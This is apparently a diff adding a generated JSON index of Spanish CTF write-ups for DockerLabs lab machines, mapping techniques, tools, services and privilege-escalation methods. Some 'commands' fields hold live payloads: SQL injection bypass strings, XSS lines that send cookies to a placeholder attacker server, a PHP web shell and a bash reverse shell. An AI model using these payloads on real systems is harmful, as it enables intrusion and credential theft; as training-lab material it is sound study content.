@@ -1,0 +1,3013 @@
+{
+  "schema_version": "0.2",
+  "generated_by": "scripts/build_relationships.py",
+  "policy": {
+    "precision_over_coverage": true,
+    "uncertain_data": "Use TODO or needs_review fields",
+    "manual_content_policy": "Generated scripts only overwrite files with AUTO-GENERATED markers"
+  },
+  "canonical": {
+    "techniques": {
+      "port-enumeration": {
+        "label": "Port enumeration",
+        "aliases": [
+          "nmap",
+          "puertos abiertos",
+          "escaneo de puertos"
+        ],
+        "phase": "enumeration"
+      },
+      "connectivity-check": {
+        "label": "Connectivity check",
+        "aliases": [
+          "ping",
+          "icmp",
+          "ttl="
+        ],
+        "phase": "enumeration"
+      },
+      "web-enumeration": {
+        "label": "Web enumeration",
+        "aliases": [
+          "whatweb",
+          "gobuster",
+          "ffuf",
+          "wfuzz",
+          "burp",
+          "panel",
+          "login",
+          "directorio"
+        ],
+        "phase": "enumeration"
+      },
+      "sql-injection": {
+        "label": "SQL Injection",
+        "aliases": [
+          "sql injection",
+          "sqli",
+          "union select",
+          "order by",
+          "updatexml",
+          "information_schema"
+        ],
+        "phase": "initial-access"
+      },
+      "login-bypass": {
+        "label": "Login bypass",
+        "aliases": [
+          "bypass",
+          "saltarnos el panel",
+          "cambiar la logica"
+        ],
+        "phase": "initial-access"
+      },
+      "command-injection": {
+        "label": "Command Injection",
+        "aliases": [
+          "command injection",
+          "inyeccion de comandos"
+        ],
+        "phase": "initial-access"
+      },
+      "lfi": {
+        "label": "Local File Inclusion",
+        "aliases": [
+          "lfi",
+          "local file inclusion",
+          "/etc/passwd",
+          "path traversal"
+        ],
+        "phase": "initial-access"
+      },
+      "rce": {
+        "label": "Remote Code Execution",
+        "aliases": [
+          "rce",
+          "remote command execution"
+        ],
+        "phase": "initial-access"
+      },
+      "ssti": {
+        "label": "SSTI",
+        "aliases": [
+          "ssti",
+          "server side template",
+          "jinja",
+          "template injection"
+        ],
+        "phase": "initial-access"
+      },
+      "malicious-file-upload": {
+        "label": "Malicious file upload",
+        "aliases": [
+          "subida de archivos",
+          "web shell",
+          "webshell",
+          "reverse shell"
+        ],
+        "phase": "initial-access"
+      },
+      "brute-force": {
+        "label": "Brute force",
+        "aliases": [
+          "fuerza bruta",
+          "hydra"
+        ],
+        "phase": "initial-access"
+      },
+      "credential-extraction": {
+        "label": "Credential extraction",
+        "aliases": [
+          "credenciales",
+          "password",
+          "contrasena",
+          "/etc/shadow",
+          "usuarios"
+        ],
+        "phase": "post-exploitation"
+      },
+      "hash-cracking": {
+        "label": "Hash cracking",
+        "aliases": [
+          "john",
+          "hash",
+          "md5",
+          "crack"
+        ],
+        "phase": "post-exploitation"
+      },
+      "metadata-analysis": {
+        "label": "Metadata analysis",
+        "aliases": [
+          "metadatos",
+          "exiftool"
+        ],
+        "phase": "enumeration"
+      },
+      "steganography": {
+        "label": "Steganography",
+        "aliases": [
+          "esteganografia",
+          "steghide",
+          "binwalk",
+          "strings"
+        ],
+        "phase": "enumeration"
+      },
+      "suid-abuse": {
+        "label": "SUID abuse",
+        "aliases": [
+          "suid",
+          "permiso 4000",
+          "-perm -4000",
+          "gtfobins"
+        ],
+        "phase": "privilege-escalation"
+      },
+      "sudo-abuse": {
+        "label": "sudo abuse",
+        "aliases": [
+          "sudo -l",
+          "permisos sudo",
+          "abuso de binario con sudo"
+        ],
+        "phase": "privilege-escalation"
+      },
+      "python-library-hijacking": {
+        "label": "Python Library Hijacking",
+        "aliases": [
+          "library hijacking",
+          "python library"
+        ],
+        "phase": "privilege-escalation"
+      },
+      "process-abuse": {
+        "label": "Process abuse",
+        "aliases": [
+          "pspy",
+          "abuso de procesos"
+        ],
+        "phase": "privilege-escalation"
+      },
+      "tty-stabilization": {
+        "label": "TTY stabilization",
+        "aliases": [
+          "tratamiento de la tty",
+          "stty raw",
+          "script /dev/null",
+          "pty.spawn",
+          "export TERM"
+        ],
+        "phase": "post-exploitation"
+      },
+      "cms-exploitation": {
+        "label": "CMS exploitation",
+        "aliases": [
+          "joomla",
+          "wordpress",
+          "cms",
+          "gestor de contenido"
+        ],
+        "phase": "initial-access"
+      },
+      "api-abuse": {
+        "label": "API abuse",
+        "aliases": [
+          " api",
+          "apis"
+        ],
+        "phase": "initial-access"
+      }
+    },
+    "tools": {
+      "nmap": {
+        "label": "Nmap",
+        "aliases": [
+          "nmap"
+        ],
+        "phase": "enumeration"
+      },
+      "ping": {
+        "label": "Ping",
+        "aliases": [
+          "ping",
+          "icmp"
+        ],
+        "phase": "enumeration"
+      },
+      "burp-suite": {
+        "label": "Burp Suite",
+        "aliases": [
+          "burp suite",
+          "burpsuite",
+          "repeater"
+        ],
+        "phase": "initial-access"
+      },
+      "sqlmap": {
+        "label": "SQLMap",
+        "aliases": [
+          "sqlmap"
+        ],
+        "phase": "initial-access"
+      },
+      "hydra": {
+        "label": "Hydra",
+        "aliases": [
+          "hydra"
+        ],
+        "phase": "initial-access"
+      },
+      "john-the-ripper": {
+        "label": "John the Ripper",
+        "aliases": [
+          "john",
+          "john the ripper"
+        ],
+        "phase": "post-exploitation"
+      },
+      "ciberchef": {
+        "label": "CiberChef",
+        "aliases": [
+          "ciberchef",
+          "cyberchef"
+        ],
+        "phase": "analysis"
+      },
+      "whatweb": {
+        "label": "WhatWeb",
+        "aliases": [
+          "whatweb"
+        ],
+        "phase": "enumeration"
+      },
+      "gobuster": {
+        "label": "Gobuster",
+        "aliases": [
+          "gobuster"
+        ],
+        "phase": "enumeration"
+      },
+      "ffuf-wfuzz": {
+        "label": "FFUF / WFuzz",
+        "aliases": [
+          "ffuf",
+          "wfuzz"
+        ],
+        "phase": "enumeration"
+      },
+      "searchsploit": {
+        "label": "Searchsploit",
+        "aliases": [
+          "searchsploit"
+        ],
+        "phase": "enumeration"
+      },
+      "netcat": {
+        "label": "Netcat",
+        "aliases": [
+          "netcat",
+          "nc -",
+          " nc "
+        ],
+        "phase": "initial-access"
+      },
+      "curl": {
+        "label": "curl",
+        "aliases": [
+          "curl"
+        ],
+        "phase": "enumeration"
+      },
+      "wget": {
+        "label": "wget",
+        "aliases": [
+          "wget"
+        ],
+        "phase": "enumeration"
+      },
+      "python": {
+        "label": "Python",
+        "aliases": [
+          "python",
+          "python3"
+        ],
+        "phase": "post-exploitation"
+      },
+      "gtfobins": {
+        "label": "GTFOBins",
+        "aliases": [
+          "gtfobins"
+        ],
+        "phase": "privilege-escalation"
+      },
+      "find": {
+        "label": "find",
+        "aliases": [
+          "find ",
+          " find"
+        ],
+        "phase": "privilege-escalation"
+      },
+      "grep": {
+        "label": "grep",
+        "aliases": [
+          "grep"
+        ],
+        "phase": "privilege-escalation"
+      },
+      "base64": {
+        "label": "base64",
+        "aliases": [
+          "base64"
+        ],
+        "phase": "analysis"
+      },
+      "sudo": {
+        "label": "sudo",
+        "aliases": [
+          "sudo",
+          "sudo -l"
+        ],
+        "phase": "privilege-escalation"
+      },
+      "ssh": {
+        "label": "ssh",
+        "aliases": [
+          "ssh",
+          "openssh"
+        ],
+        "phase": "initial-access"
+      },
+      "rpcclient": {
+        "label": "rpcclient",
+        "aliases": [
+          "rpcclient"
+        ],
+        "phase": "enumeration"
+      },
+      "smbclient": {
+        "label": "smbclient",
+        "aliases": [
+          "smbclient"
+        ],
+        "phase": "enumeration"
+      },
+      "crackmapexec": {
+        "label": "CrackMapExec",
+        "aliases": [
+          "crackmapexec",
+          "cme"
+        ],
+        "phase": "enumeration"
+      },
+      "exiftool": {
+        "label": "ExifTool",
+        "aliases": [
+          "exiftool"
+        ],
+        "phase": "analysis"
+      },
+      "steghide": {
+        "label": "steghide",
+        "aliases": [
+          "steghide"
+        ],
+        "phase": "analysis"
+      },
+      "binwalk": {
+        "label": "binwalk",
+        "aliases": [
+          "binwalk"
+        ],
+        "phase": "analysis"
+      },
+      "strings": {
+        "label": "strings",
+        "aliases": [
+          "strings"
+        ],
+        "phase": "analysis"
+      },
+      "nodejs": {
+        "label": "Node.js",
+        "aliases": [
+          "node.js",
+          "nodejs",
+          "node "
+        ],
+        "phase": "privilege-escalation"
+      },
+      "vim": {
+        "label": "Vim",
+        "aliases": [
+          "binario vim",
+          "sudo vim",
+          "/usr/bin/vim"
+        ],
+        "phase": "privilege-escalation"
+      },
+      "nano": {
+        "label": "nano",
+        "aliases": [
+          "binario nano",
+          "sudo nano",
+          "/usr/bin/nano"
+        ],
+        "phase": "privilege-escalation"
+      },
+      "ruby": {
+        "label": "Ruby",
+        "aliases": [
+          "ruby"
+        ],
+        "phase": "privilege-escalation"
+      },
+      "dd": {
+        "label": "dd",
+        "aliases": [
+          " dd ",
+          "binario dd"
+        ],
+        "phase": "privilege-escalation"
+      },
+      "env": {
+        "label": "env",
+        "aliases": [
+          " env ",
+          "binario env"
+        ],
+        "phase": "privilege-escalation"
+      }
+    },
+    "services": {
+      "ssh": {
+        "label": "SSH",
+        "aliases": [
+          "ssh",
+          "openssh",
+          "puerto 22"
+        ],
+        "enumeration": [
+          "port-enumeration",
+          "brute-force"
+        ]
+      },
+      "http": {
+        "label": "HTTP",
+        "aliases": [
+          "http",
+          "web",
+          "puerto 80"
+        ],
+        "enumeration": [
+          "web-enumeration"
+        ]
+      },
+      "apache": {
+        "label": "Apache",
+        "aliases": [
+          "apache"
+        ],
+        "enumeration": [
+          "web-enumeration"
+        ]
+      },
+      "nginx": {
+        "label": "Nginx",
+        "aliases": [
+          "nginx"
+        ],
+        "enumeration": [
+          "web-enumeration"
+        ]
+      },
+      "mariadb-mysql": {
+        "label": "MariaDB / MySQL",
+        "aliases": [
+          "mariadb",
+          "mysql",
+          "information_schema"
+        ],
+        "enumeration": [
+          "sql-injection"
+        ]
+      },
+      "ftp": {
+        "label": "FTP",
+        "aliases": [
+          "ftp",
+          "puerto 21"
+        ],
+        "enumeration": [
+          "port-enumeration",
+          "brute-force"
+        ]
+      },
+      "smb": {
+        "label": "SMB / Samba",
+        "aliases": [
+          "smb",
+          "samba",
+          "rpcclient",
+          "smbclient",
+          "445"
+        ],
+        "enumeration": [
+          "port-enumeration"
+        ]
+      },
+      "jenkins": {
+        "label": "Jenkins",
+        "aliases": [
+          "jenkins"
+        ],
+        "enumeration": [
+          "web-enumeration"
+        ]
+      },
+      "grafana": {
+        "label": "Grafana",
+        "aliases": [
+          "grafana"
+        ],
+        "enumeration": [
+          "web-enumeration"
+        ]
+      },
+      "tomcat": {
+        "label": "Tomcat",
+        "aliases": [
+          "tomcat",
+          "8009",
+          "8080"
+        ],
+        "enumeration": [
+          "web-enumeration"
+        ]
+      },
+      "joomla": {
+        "label": "Joomla",
+        "aliases": [
+          "joomla"
+        ],
+        "enumeration": [
+          "web-enumeration",
+          "cms-exploitation"
+        ]
+      },
+      "php": {
+        "label": "PHP",
+        "aliases": [
+          "php"
+        ],
+        "enumeration": [
+          "web-enumeration"
+        ]
+      },
+      "nodejs-service": {
+        "label": "Node.js service",
+        "aliases": [
+          "node.js",
+          "nodejs"
+        ],
+        "enumeration": [
+          "web-enumeration"
+        ]
+      },
+      "api": {
+        "label": "API",
+        "aliases": [
+          " api",
+          "apis"
+        ],
+        "enumeration": [
+          "web-enumeration",
+          "api-abuse"
+        ]
+      }
+    },
+    "vulnerabilities": {
+      "unsanitized-user-input": {
+        "label": "Unsanitized user input",
+        "techniques": [
+          "sql-injection",
+          "command-injection",
+          "ssti"
+        ]
+      },
+      "exposed-error-message": {
+        "label": "Exposed error message",
+        "techniques": [
+          "sql-injection",
+          "lfi"
+        ]
+      },
+      "weak-credentials": {
+        "label": "Weak credentials",
+        "techniques": [
+          "brute-force",
+          "credential-extraction"
+        ]
+      },
+      "insecure-file-upload": {
+        "label": "Insecure file upload",
+        "techniques": [
+          "malicious-file-upload",
+          "rce"
+        ]
+      },
+      "suid-misconfiguration": {
+        "label": "SUID misconfiguration",
+        "techniques": [
+          "suid-abuse"
+        ]
+      },
+      "sudo-misconfiguration": {
+        "label": "sudo misconfiguration",
+        "techniques": [
+          "sudo-abuse"
+        ]
+      },
+      "secret-in-metadata": {
+        "label": "Secret in metadata",
+        "techniques": [
+          "metadata-analysis",
+          "steganography"
+        ]
+      }
+    },
+    "privilege_methods": {
+      "suid-binary-abuse": {
+        "label": "SUID binary abuse",
+        "techniques": [
+          "suid-abuse"
+        ]
+      },
+      "sudo-binary-abuse": {
+        "label": "sudo binary abuse",
+        "techniques": [
+          "sudo-abuse"
+        ]
+      },
+      "python-library-hijacking": {
+        "label": "Python Library Hijacking",
+        "techniques": [
+          "python-library-hijacking"
+        ]
+      },
+      "process-abuse": {
+        "label": "Process abuse",
+        "techniques": [
+          "process-abuse"
+        ]
+      },
+      "hash-cracking-to-root": {
+        "label": "Hash cracking to root",
+        "techniques": [
+          "hash-cracking",
+          "credential-extraction"
+        ]
+      }
+    }
+  },
+  "nodes": {
+    "machines": [
+      {
+        "id": "backend",
+        "label": "Backend",
+        "source_path": "Maquinas De Dockerlabs/Maquinas Faciles/Backend.md",
+        "page_path": "machines/dockerlabs/facil/backend.md",
+        "platform": "dockerlabs",
+        "difficulty": "facil",
+        "os": "linux",
+        "ports": [
+          22,
+          80
+        ],
+        "services": [
+          "apache",
+          "http",
+          "mariadb-mysql",
+          "ssh"
+        ],
+        "tools": [
+          "burp-suite",
+          "find",
+          "grep",
+          "gtfobins",
+          "john-the-ripper",
+          "nmap",
+          "ping",
+          "python",
+          "ssh"
+        ],
+        "mentioned_tools": [
+          "sqlmap"
+        ],
+        "techniques": [
+          "connectivity-check",
+          "credential-extraction",
+          "hash-cracking",
+          "login-bypass",
+          "port-enumeration",
+          "sql-injection",
+          "suid-abuse",
+          "tty-stabilization",
+          "web-enumeration"
+        ],
+        "vulnerabilities": [
+          "exposed-error-message",
+          "suid-misconfiguration",
+          "unsanitized-user-input",
+          "weak-credentials"
+        ],
+        "privilege_methods": [
+          "hash-cracking-to-root",
+          "suid-binary-abuse"
+        ],
+        "commands": [
+          "SELECT * FROM usuarios WHERE usuario = 'tu usuario' AND password = 'tu contraseña';",
+          "SELECT * FROM usuarios WHERE usuario = ‘’ ’ AND password = 'tu contraseña';",
+          "SELECT * FROM usuarios WHERE usuario = ‘’ OR sleep(2)-- - ’ AND password = 'tu contraseña';",
+          "SELECT * FROM usuarios WHERE usuario = ‘’ OR sleep(2);",
+          "upatexml(1, concat(0x7e, (SELECT database())), 1)",
+          "updatexml(1,concat(0x7e,(SELECT schema_name FROM information_schema.schemata)),1)-- -"
+        ],
+        "word_count": 2727,
+        "image_count": 46,
+        "needs_review": false
+      },
+      {
+        "id": "candy",
+        "label": "Candy",
+        "source_path": "Maquinas De Dockerlabs/Maquinas Faciles/Candy.md",
+        "page_path": "machines/dockerlabs/facil/candy.md",
+        "platform": "dockerlabs",
+        "difficulty": "facil",
+        "os": "linux",
+        "ports": [
+          80,
+          1234
+        ],
+        "services": [
+          "apache",
+          "http",
+          "joomla",
+          "php"
+        ],
+        "tools": [
+          "base64",
+          "ciberchef",
+          "find",
+          "grep",
+          "gtfobins",
+          "netcat",
+          "nmap",
+          "ping",
+          "ruby",
+          "strings",
+          "sudo",
+          "whatweb"
+        ],
+        "mentioned_tools": [],
+        "techniques": [
+          "cms-exploitation",
+          "connectivity-check",
+          "credential-extraction",
+          "malicious-file-upload",
+          "metadata-analysis",
+          "port-enumeration",
+          "rce",
+          "steganography",
+          "sudo-abuse",
+          "suid-abuse",
+          "web-enumeration"
+        ],
+        "vulnerabilities": [
+          "insecure-file-upload",
+          "secret-in-metadata",
+          "sudo-misconfiguration",
+          "suid-misconfiguration",
+          "weak-credentials"
+        ],
+        "privilege_methods": [
+          "sudo-binary-abuse",
+          "suid-binary-abuse"
+        ],
+        "commands": [],
+        "word_count": 2168,
+        "image_count": 31,
+        "needs_review": false
+      },
+      {
+        "id": "console-log",
+        "label": "Console log",
+        "source_path": "Maquinas De Dockerlabs/Maquinas Faciles/Console log.md",
+        "page_path": "machines/dockerlabs/facil/console-log.md",
+        "platform": "dockerlabs",
+        "difficulty": "facil",
+        "os": "linux",
+        "ports": [
+          22,
+          80,
+          3000
+        ],
+        "services": [
+          "apache",
+          "api",
+          "http",
+          "joomla",
+          "nodejs-service",
+          "php",
+          "ssh"
+        ],
+        "tools": [
+          "gtfobins",
+          "nano",
+          "nmap",
+          "nodejs",
+          "ping",
+          "ruby",
+          "ssh",
+          "sudo",
+          "whatweb"
+        ],
+        "mentioned_tools": [],
+        "techniques": [
+          "api-abuse",
+          "cms-exploitation",
+          "connectivity-check",
+          "credential-extraction",
+          "port-enumeration",
+          "suid-abuse",
+          "web-enumeration"
+        ],
+        "vulnerabilities": [
+          "suid-misconfiguration",
+          "weak-credentials"
+        ],
+        "privilege_methods": [
+          "suid-binary-abuse"
+        ],
+        "commands": [],
+        "word_count": 1693,
+        "image_count": 26,
+        "needs_review": false
+      },
+      {
+        "id": "extraviado",
+        "label": "Extraviado",
+        "source_path": "Maquinas De Dockerlabs/Maquinas Faciles/Extraviado.md",
+        "page_path": "machines/dockerlabs/facil/extraviado.md",
+        "platform": "dockerlabs",
+        "difficulty": "facil",
+        "os": "linux",
+        "ports": [],
+        "services": [
+          "apache",
+          "http",
+          "ssh"
+        ],
+        "tools": [
+          "base64",
+          "ciberchef",
+          "nmap",
+          "ping",
+          "ssh"
+        ],
+        "mentioned_tools": [],
+        "techniques": [
+          "connectivity-check",
+          "credential-extraction",
+          "metadata-analysis",
+          "port-enumeration",
+          "web-enumeration"
+        ],
+        "vulnerabilities": [
+          "secret-in-metadata",
+          "weak-credentials"
+        ],
+        "privilege_methods": [],
+        "commands": [],
+        "word_count": 1104,
+        "image_count": 20,
+        "needs_review": false
+      },
+      {
+        "id": "hiddencat",
+        "label": "HiddenCat",
+        "source_path": "Maquinas De Dockerlabs/Maquinas Faciles/HiddenCat.md",
+        "page_path": "machines/dockerlabs/facil/hiddencat.md",
+        "platform": "dockerlabs",
+        "difficulty": "facil",
+        "os": "linux",
+        "ports": [
+          8009,
+          8080
+        ],
+        "services": [
+          "apache",
+          "http",
+          "nginx",
+          "ssh",
+          "tomcat"
+        ],
+        "tools": [
+          "find",
+          "gtfobins",
+          "nmap",
+          "ping",
+          "python",
+          "ssh",
+          "sudo"
+        ],
+        "mentioned_tools": [],
+        "techniques": [
+          "brute-force",
+          "connectivity-check",
+          "credential-extraction",
+          "lfi",
+          "malicious-file-upload",
+          "port-enumeration",
+          "suid-abuse",
+          "tty-stabilization"
+        ],
+        "vulnerabilities": [
+          "exposed-error-message",
+          "insecure-file-upload",
+          "suid-misconfiguration",
+          "weak-credentials"
+        ],
+        "privilege_methods": [
+          "suid-binary-abuse"
+        ],
+        "commands": [
+          "sudo docker run -d --ulimit nofile=32768:65536 hiddencat",
+          "script /dev/null -c bash",
+          "stty raw -echo; fg",
+          "export TERM=xterm\nexport SHELL=/bin/bash"
+        ],
+        "word_count": 2104,
+        "image_count": 18,
+        "needs_review": false
+      },
+      {
+        "id": "internship",
+        "label": "Internship",
+        "source_path": "Maquinas De Dockerlabs/Maquinas Faciles/Internship.md",
+        "page_path": "machines/dockerlabs/facil/internship.md",
+        "platform": "dockerlabs",
+        "difficulty": "facil",
+        "os": "linux",
+        "ports": [
+          80,
+          1234
+        ],
+        "services": [
+          "apache",
+          "http",
+          "php",
+          "ssh"
+        ],
+        "tools": [
+          "base64",
+          "exiftool",
+          "grep",
+          "netcat",
+          "nmap",
+          "ping",
+          "python",
+          "ssh",
+          "steghide",
+          "strings"
+        ],
+        "mentioned_tools": [],
+        "techniques": [
+          "brute-force",
+          "connectivity-check",
+          "credential-extraction",
+          "login-bypass",
+          "malicious-file-upload",
+          "metadata-analysis",
+          "port-enumeration",
+          "sql-injection",
+          "steganography",
+          "tty-stabilization",
+          "web-enumeration"
+        ],
+        "vulnerabilities": [
+          "exposed-error-message",
+          "insecure-file-upload",
+          "secret-in-metadata",
+          "unsanitized-user-input",
+          "weak-credentials"
+        ],
+        "privilege_methods": [],
+        "commands": [
+          "SELECT * FROM usuarios WHERE usuario = 'tu usuario' AND password = 'tu contraseña';",
+          "SELECT * FROM usuarios WHERE usuario = ‘’ ’ AND password = 'tu contraseña';",
+          "SELECT * FROM usuarios WHERE usuario = ‘’ OR 1=1-- - ’ AND password = 'tu contraseña';",
+          "SELECT * FROM usuarios WHERE usuario = ‘’ OR 1=1;",
+          "script /dev/null -c bash",
+          "stty raw -echo; fg"
+        ],
+        "word_count": 2501,
+        "image_count": 35,
+        "needs_review": false
+      },
+      {
+        "id": "library",
+        "label": "Library",
+        "source_path": "Maquinas De Dockerlabs/Maquinas Faciles/Library.md",
+        "page_path": "machines/dockerlabs/facil/library.md",
+        "platform": "dockerlabs",
+        "difficulty": "facil",
+        "os": "linux",
+        "ports": [
+          22,
+          80
+        ],
+        "services": [
+          "apache",
+          "ftp",
+          "http",
+          "joomla",
+          "php",
+          "ssh"
+        ],
+        "tools": [
+          "ffuf-wfuzz",
+          "gobuster",
+          "nmap",
+          "ping",
+          "python",
+          "ruby",
+          "ssh",
+          "sudo",
+          "whatweb"
+        ],
+        "mentioned_tools": [],
+        "techniques": [
+          "brute-force",
+          "cms-exploitation",
+          "connectivity-check",
+          "credential-extraction",
+          "port-enumeration",
+          "python-library-hijacking",
+          "web-enumeration"
+        ],
+        "vulnerabilities": [
+          "weak-credentials"
+        ],
+        "privilege_methods": [
+          "python-library-hijacking"
+        ],
+        "commands": [],
+        "word_count": 1716,
+        "image_count": 27,
+        "needs_review": false
+      },
+      {
+        "id": "move",
+        "label": "Move",
+        "source_path": "Maquinas De Dockerlabs/Maquinas Faciles/Move.md",
+        "page_path": "machines/dockerlabs/facil/move.md",
+        "platform": "dockerlabs",
+        "difficulty": "facil",
+        "os": "linux",
+        "ports": [
+          21,
+          22,
+          80
+        ],
+        "services": [
+          "apache",
+          "api",
+          "ftp",
+          "grafana",
+          "http",
+          "mariadb-mysql",
+          "php",
+          "ssh"
+        ],
+        "tools": [
+          "burp-suite",
+          "curl",
+          "ffuf-wfuzz",
+          "gobuster",
+          "john-the-ripper",
+          "nmap",
+          "ping",
+          "python",
+          "searchsploit",
+          "ssh",
+          "sudo",
+          "wget"
+        ],
+        "mentioned_tools": [],
+        "techniques": [
+          "api-abuse",
+          "connectivity-check",
+          "credential-extraction",
+          "hash-cracking",
+          "lfi",
+          "malicious-file-upload",
+          "metadata-analysis",
+          "port-enumeration",
+          "tty-stabilization",
+          "web-enumeration"
+        ],
+        "vulnerabilities": [
+          "exposed-error-message",
+          "insecure-file-upload",
+          "secret-in-metadata",
+          "weak-credentials"
+        ],
+        "privilege_methods": [
+          "hash-cracking-to-root"
+        ],
+        "commands": [
+          "script /dev/null -c bash",
+          "stty raw -echo; fg",
+          "export TERM=xterm\nexport SHELL=/bin/bash"
+        ],
+        "word_count": 2326,
+        "image_count": 33,
+        "needs_review": false
+      },
+      {
+        "id": "nodeclimb",
+        "label": "nodeclimb",
+        "source_path": "Maquinas De Dockerlabs/Maquinas Faciles/nodeclimb.md",
+        "page_path": "machines/dockerlabs/facil/nodeclimb.md",
+        "platform": "dockerlabs",
+        "difficulty": "facil",
+        "os": "linux",
+        "ports": [
+          21
+        ],
+        "services": [
+          "ftp",
+          "nodejs-service",
+          "ssh"
+        ],
+        "tools": [
+          "find",
+          "john-the-ripper",
+          "nmap",
+          "nodejs",
+          "ping",
+          "ssh",
+          "sudo",
+          "wget"
+        ],
+        "mentioned_tools": [],
+        "techniques": [
+          "connectivity-check",
+          "credential-extraction",
+          "hash-cracking",
+          "port-enumeration",
+          "sudo-abuse",
+          "suid-abuse",
+          "web-enumeration"
+        ],
+        "vulnerabilities": [
+          "sudo-misconfiguration",
+          "suid-misconfiguration",
+          "weak-credentials"
+        ],
+        "privilege_methods": [
+          "hash-cracking-to-root",
+          "sudo-binary-abuse",
+          "suid-binary-abuse"
+        ],
+        "commands": [],
+        "word_count": 1324,
+        "image_count": 22,
+        "needs_review": false
+      },
+      {
+        "id": "pequenas-mentirosas",
+        "label": "Pequeñas mentirosas",
+        "source_path": "Maquinas De Dockerlabs/Maquinas Faciles/Pequeñas_mentirosas.md",
+        "page_path": "machines/dockerlabs/facil/pequenas-mentirosas.md",
+        "platform": "dockerlabs",
+        "difficulty": "facil",
+        "os": "linux",
+        "ports": [
+          22,
+          80
+        ],
+        "services": [
+          "apache",
+          "ftp",
+          "http",
+          "ssh"
+        ],
+        "tools": [
+          "gtfobins",
+          "hydra",
+          "nmap",
+          "ping",
+          "python",
+          "ssh",
+          "sudo"
+        ],
+        "mentioned_tools": [],
+        "techniques": [
+          "brute-force",
+          "connectivity-check",
+          "credential-extraction",
+          "port-enumeration",
+          "suid-abuse",
+          "web-enumeration"
+        ],
+        "vulnerabilities": [
+          "suid-misconfiguration",
+          "weak-credentials"
+        ],
+        "privilege_methods": [
+          "suid-binary-abuse"
+        ],
+        "commands": [],
+        "word_count": 1034,
+        "image_count": 18,
+        "needs_review": false
+      },
+      {
+        "id": "psycho",
+        "label": "Psycho",
+        "source_path": "Maquinas De Dockerlabs/Maquinas Faciles/Psycho.md",
+        "page_path": "machines/dockerlabs/facil/psycho.md",
+        "platform": "dockerlabs",
+        "difficulty": "facil",
+        "os": "linux",
+        "ports": [],
+        "services": [
+          "http",
+          "php",
+          "ssh"
+        ],
+        "tools": [
+          "nmap",
+          "ping",
+          "python",
+          "ruby",
+          "ssh",
+          "sudo"
+        ],
+        "mentioned_tools": [],
+        "techniques": [
+          "connectivity-check",
+          "credential-extraction",
+          "lfi",
+          "port-enumeration",
+          "python-library-hijacking",
+          "rce",
+          "sudo-abuse",
+          "web-enumeration"
+        ],
+        "vulnerabilities": [
+          "exposed-error-message",
+          "insecure-file-upload",
+          "sudo-misconfiguration",
+          "weak-credentials"
+        ],
+        "privilege_methods": [
+          "python-library-hijacking",
+          "sudo-binary-abuse"
+        ],
+        "commands": [],
+        "word_count": 1390,
+        "image_count": 21,
+        "needs_review": false
+      },
+      {
+        "id": "reflection",
+        "label": "Reflection",
+        "source_path": "Maquinas De Dockerlabs/Maquinas Faciles/Reflection.md",
+        "page_path": "machines/dockerlabs/facil/reflection.md",
+        "platform": "dockerlabs",
+        "difficulty": "facil",
+        "os": "linux",
+        "ports": [
+          22,
+          80
+        ],
+        "services": [
+          "apache",
+          "http",
+          "php",
+          "ssh"
+        ],
+        "tools": [
+          "burp-suite",
+          "find",
+          "nmap",
+          "ping",
+          "python",
+          "ssh"
+        ],
+        "mentioned_tools": [],
+        "techniques": [
+          "connectivity-check",
+          "credential-extraction",
+          "port-enumeration",
+          "suid-abuse",
+          "tty-stabilization",
+          "web-enumeration"
+        ],
+        "vulnerabilities": [
+          "suid-misconfiguration",
+          "weak-credentials"
+        ],
+        "privilege_methods": [
+          "suid-binary-abuse"
+        ],
+        "commands": [
+          "<h1 style=\"color:red\">AQUI ESTAMOS INYECTANDO HTML</h1>",
+          "<marquee>Estas son etiquetas HTML</marquee>",
+          "<a href=\"#\" onclick=\"alert('XSS')\">Haz click aqui :3</a>",
+          "<img src=x onerror=\"console.log('XSS funcionando')\">",
+          "<img src=x onerror=\"window.location='http://servidor_del_atacante/log.php?c='+document.cookie\">",
+          "<svg/onload=\"location.href='http://servidor_del_atacante/log.php?c='+document.cookie\">"
+        ],
+        "word_count": 2712,
+        "image_count": 43,
+        "needs_review": false
+      },
+      {
+        "id": "secretjenkins",
+        "label": "SecretJenkins",
+        "source_path": "Maquinas De Dockerlabs/Maquinas Faciles/SecretJenkins.md",
+        "page_path": "machines/dockerlabs/facil/secretjenkins.md",
+        "platform": "dockerlabs",
+        "difficulty": "facil",
+        "os": "linux",
+        "ports": [
+          22,
+          8080
+        ],
+        "services": [
+          "http",
+          "jenkins",
+          "joomla",
+          "php",
+          "ssh",
+          "tomcat"
+        ],
+        "tools": [
+          "grep",
+          "nmap",
+          "ping",
+          "python",
+          "ruby",
+          "searchsploit",
+          "ssh",
+          "sudo",
+          "whatweb"
+        ],
+        "mentioned_tools": [],
+        "techniques": [
+          "brute-force",
+          "cms-exploitation",
+          "connectivity-check",
+          "credential-extraction",
+          "lfi",
+          "malicious-file-upload",
+          "metadata-analysis",
+          "port-enumeration",
+          "tty-stabilization",
+          "web-enumeration"
+        ],
+        "vulnerabilities": [
+          "exposed-error-message",
+          "insecure-file-upload",
+          "secret-in-metadata",
+          "weak-credentials"
+        ],
+        "privilege_methods": [],
+        "commands": [
+          "script /dev/null -c bash",
+          "stty raw -echo; fg",
+          "export TERM=xterm\nexport SHELL=/bin/bash"
+        ],
+        "word_count": 2105,
+        "image_count": 26,
+        "needs_review": false
+      },
+      {
+        "id": "upload",
+        "label": "Upload",
+        "source_path": "Maquinas De Dockerlabs/Maquinas Faciles/Upload.md",
+        "page_path": "machines/dockerlabs/facil/upload.md",
+        "platform": "dockerlabs",
+        "difficulty": "facil",
+        "os": "linux",
+        "ports": [
+          1234
+        ],
+        "services": [
+          "apache",
+          "http",
+          "php"
+        ],
+        "tools": [
+          "ffuf-wfuzz",
+          "gobuster",
+          "gtfobins",
+          "netcat",
+          "nmap",
+          "ping",
+          "python",
+          "sudo"
+        ],
+        "mentioned_tools": [],
+        "techniques": [
+          "connectivity-check",
+          "credential-extraction",
+          "malicious-file-upload",
+          "port-enumeration",
+          "rce",
+          "suid-abuse",
+          "tty-stabilization",
+          "web-enumeration"
+        ],
+        "vulnerabilities": [
+          "insecure-file-upload",
+          "suid-misconfiguration",
+          "weak-credentials"
+        ],
+        "privilege_methods": [
+          "suid-binary-abuse"
+        ],
+        "commands": [
+          "<?php\necho \"TESTING\";\n?>",
+          "<?php\necho \"<pre>\" . shell_exec($_REQUEST['hacked']) . \"</pre>\";\n?>",
+          "bash -c \"bash -i >& /dev/tcp/172.17.0.1/1234 0>&1\"",
+          "script /dev/null -c bash",
